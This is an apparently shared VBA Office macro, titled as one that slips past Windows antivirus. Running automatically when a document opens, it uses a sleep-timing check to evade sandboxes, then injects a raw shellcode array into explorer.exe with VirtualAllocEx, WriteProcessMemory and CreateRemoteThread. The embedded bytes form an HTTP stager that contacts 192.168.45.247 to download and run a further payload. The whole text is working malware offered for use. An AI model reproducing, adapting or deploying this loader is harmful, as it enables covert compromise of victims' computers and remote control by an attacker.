**Sleep delay and raw shell code bypassed Windows AV**

```

  
Private Declare PtrSafe Function OpenProcess Lib "kernel32" ( _
        ByVal dwDesiredAccess As Long, _
        ByVal bInheritHandle As Long, _
        ByVal dwProcessId As Long _
    ) As Long
    
Declare PtrSafe Function WriteProcessMemory Lib "Kernel32.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpBaseAddress As LongPtr, _
    ByRef lpBuffer As Any, _
    ByVal nSize As LongPtr, _
    ByRef lpNumberOfBytesWritten As LongPtr _
    ) As LongPtr
    
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Declare PtrSafe Function VirtualAllocEx Lib "Kernel32.dll" ( _
    ByVal hProcess As LongPtr, _
    ByVal lpAddr As LongPtr, _
    ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long _
    ) As LongPtr


Declare PtrSafe Function CreateRemoteThread Lib "Kernel32.dll" ( _
    ByVal hProcess As LongPtr, _
    ByRef lpThreadAttributes As Any, _
    ByVal dwStackSize As LongPtr, _
    ByVal lpStartAddress As LongPtr, _
    ByVal lpParameter As LongPtr, _
    ByVal dwCreationFlags As Long, _
    ByRef lpThreadId As LongPtr _
    ) As LongPtr

Private Declare PtrSafe Function CloseHandle Lib "kernel32" ( _
    ByVal hObject As LongPtr _
    ) As Long

Sub MyMacro()
'
' MyMacro Macro
'
'
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)

If time < 2 Then
    End
End If

    ' Get explorer.exe process PID dynamically with WMI
    Dim pid As Long
    strComputer = "."
    
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\CIMV2")
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Process", , 48)
    For Each objItem In colItems
        If objItem.Name = "explorer.exe" Then
            pid = objItem.processId
            MsgBox ("Pid: " + Str(pid))
            Exit For
        End If
    Next

res = OpenProcess(&H1F0FFF, 0, pid)

rawr = Array(252, 72, 131, 228, 240, 232, 204, 0, 0, 0, 65, 81, 65, 80, 82, 72, 49, 210, 81, 86, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 77, 49, 201, 72, 15, 183, 74, 74, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 102, 129, 120, 24, _
11, 2, 15, 133, 114, 0, 0, 0, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 68, 139, 64, 32, 80, 73, 1, 208, 139, 72, 24, 227, 86, 77, 49, 201, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 72, 49, 192, 65, 193, 201, 13, 172, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, _
208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 75, 255, 255, 255, 93, 72, 49, 219, 83, 73, 190, 119, 105, 110, 105, 110, 101, 116, 0, 65, 86, 72, 137, 225, 73, 199, 194, 76, 119, 38, 7, _
255, 213, 83, 83, 232, 173, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 32, 105, 80, 104, 111, 110, 101, 59, 32, 67, 80, 85, 32, 32, 105, 80, 104, 111, 110, 101, 32, 79, 83, 32, 49, 56, 95, 54, 95, 50, 32, 108, 105, 107, 101, 32, 77, 97, 99, 32, 79, 83, 32, 88, 41, 32, 65, 112, 112, 108, 101, 87, 101, 98, 75, 105, 116, 47, _
54, 48, 53, 46, 49, 46, 49, 53, 32, 40, 75, 72, 84, 77, 76, 44, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 41, 32, 86, 101, 114, 115, 105, 111, 110, 47, 49, 56, 46, 54, 46, 50, 32, 77, 111, 98, 105, 108, 101, 47, 49, 53, 69, 49, 52, 56, 32, 83, 97, 102, 97, 114, 105, 47, 54, 48, 53, 46, 49, 46, 49, 53, 32, 66, 105, 110, 103, 83, 97, _
112, 112, 104, 105, 114, 101, 47, 51, 49, 46, 52, 46, 52, 51, 48, 52, 51, 48, 48, 48, 49, 0, 89, 83, 90, 77, 49, 192, 77, 49, 201, 83, 83, 73, 186, 58, 86, 121, 167, 0, 0, 0, 0, 255, 213, 232, 15, 0, 0, 0, 49, 57, 50, 46, 49, 54, 56, 46, 52, 53, 46, 50, 52, 55, 0, 90, 72, 137, 193, 73, 199, 192, 107, 33, 0, 0, 77, 49, 201, 83, _
83, 106, 3, 83, 73, 186, 87, 137, 159, 198, 0, 0, 0, 0, 255, 213, 232, 184, 0, 0, 0, 47, 74, 78, 71, 48, 115, 48, 114, 116, 76, 99, 69, 84, 50, 104, 76, 89, 101, 120, 115, 73, 77, 119, 101, 78, 103, 67, 95, 89, 111, 118, 51, 89, 90, 54, 81, 71, 98, 82, 69, 53, 54, 49, 70, 71, 76, 97, 77, 116, 79, 49, 79, 70, 69, 114, 56, 122, 112, 104, _
88, 81, 48, 98, 48, 121, 49, 70, 68, 53, 67, 73, 101, 116, 87, 49, 57, 109, 108, 82, 55, 117, 102, 57, 49, 50, 100, 112, 118, 82, 50, 56, 72, 82, 88, 115, 77, 100, 106, 68, 54, 112, 82, 116, 53, 103, 112, 48, 95, 117, 87, 57, 106, 68, 75, 116, 121, 102, 120, 88, 73, 121, 104, 97, 86, 116, 55, 107, 89, 113, 54, 52, 83, 79, 106, 57, 69, 109, 53, 84, _
90, 103, 106, 120, 50, 81, 52, 76, 107, 101, 72, 45, 55, 90, 72, 71, 103, 88, 48, 81, 71, 81, 55, 98, 49, 73, 55, 120, 101, 82, 50, 109, 45, 120, 114, 45, 110, 52, 83, 89, 79, 100, 50, 106, 0, 72, 137, 193, 83, 90, 65, 88, 77, 49, 201, 83, 72, 184, 0, 50, 168, 132, 0, 0, 0, 0, 80, 83, 83, 73, 199, 194, 235, 85, 46, 59, 255, 213, 72, 137, _
198, 106, 10, 95, 72, 137, 241, 106, 31, 90, 82, 104, 128, 51, 0, 0, 73, 137, 224, 106, 4, 65, 89, 73, 186, 117, 70, 158, 134, 0, 0, 0, 0, 255, 213, 77, 49, 192, 83, 90, 72, 137, 241, 77, 49, 201, 77, 49, 201, 83, 83, 73, 199, 194, 45, 6, 24, 123, 255, 213, 133, 192, 117, 31, 72, 199, 193, 136, 19, 0, 0, 73, 186, 68, 240, 53, 224, 0, 0, 0, _
0, 255, 213, 72, 255, 207, 116, 2, 235, 170, 232, 85, 0, 0, 0, 83, 89, 106, 64, 90, 73, 137, 209, 193, 226, 16, 73, 199, 192, 0, 16, 0, 0, 73, 186, 88, 164, 83, 229, 0, 0, 0, 0, 255, 213, 72, 147, 83, 83, 72, 137, 231, 72, 137, 241, 72, 137, 218, 73, 199, 192, 0, 32, 0, 0, 73, 137, 249, 73, 186, 18, 150, 137, 226, 0, 0, 0, 0, 255, 213, _
72, 131, 196, 32, 133, 192, 116, 178, 102, 139, 7, 72, 1, 195, 133, 192, 117, 210, 88, 195, 88, 106, 0, 89, 73, 199, 194, 240, 181, 162, 86, 255, 213)
   
   ' Allocate memory block for storing shellcode
    Dim lpAddr As LongPtr
    lpAddr = VirtualAllocEx(res, 0, UBound(rawr) + 1, &H3000, &H40)
    
 '  Write shellcode into newly allocated memory block one byte at a time
    Dim wMem As LongPtr
    Dim counter As Long
    Dim data As Long
    
    For counter = LBound(rawr) To UBound(rawr)
        data = rawr(counter)
        wMem = WriteProcessMemory(res, lpAddr + counter, data, 1, 0)
    Next counter
    
    'Create remote thread for shellcode execution
    Dim rThread As LongPtr
    rThread = CreateRemoteThread(res, 0, 0, lpAddr, 0, 0, 0)
    
    ' Close explorer.exe handle opened by OpenProcess
    CloseHandle (res)

End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub


```
